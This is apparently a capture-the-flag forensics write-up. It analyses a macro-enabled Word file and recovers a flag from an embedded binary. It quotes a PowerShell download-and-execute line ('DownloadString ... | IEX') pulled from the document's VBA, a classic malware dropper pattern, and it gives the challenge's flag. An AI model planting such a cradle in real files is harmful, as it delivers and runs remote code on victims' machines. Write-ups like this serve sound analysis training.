# X-Wing Specs?

> This file was sent to Jun Sato - claiming to contian specifics on our next-gen X-Wings. However, it seems to be trickery.
> 
> Can you help find out what this file is actually doing?
> 
> Please note this file may trip your anti-virus, but it contains no malicious code. Everything in the file is harmless

This one was a little tricky at the end, but when I came back to it a second time I noticed the flag in the output.

Basically, this is a Word file (.docm) which contains a compiled VBA script that downloads a PowerShell script that has an embedded Mach-O executable that contains the flag.

To start with, Word documents (at least modern Word) are just ZIP files, so we can just unzip the Word document:

```
$ unzip bad.docm
```

When doing that, I noticed one unusual file

```
inflating: word/vbaProject.bin
```

Looking at that file I noticed the following (there were a few other interesting words, but this is the main thing that stood out):

```
$ strings word/vbaProject.bin    
...
powershell (New-Object System.Net.WebClient).DownloadString('https://challenges.silicon-ctf.party/for300/mal.ps1') | IEX'
...
```

Fetching that PowerShell script and examining it I noticed the following:

```
...
[Byte[]] $buf = 0xcf,0xfa,0xed,0xfe,...
...
```

I then took the bytes from above, placed them into a file to reconstruct the binary, then ran that through strings and obtained the following interesting output:

```
$ xxd -r -p hexdump| strings | less
...
silicon{W0rd
_d0cs_ca@n_b3_a_lucerative_v3cto
...
```

Which isn't a complete flag, but it was enough that I tried and made an assumption, which worked.

```
silicon{W0rd_d0cs_ca@n_b3_a_lucerative_v3ctor}
```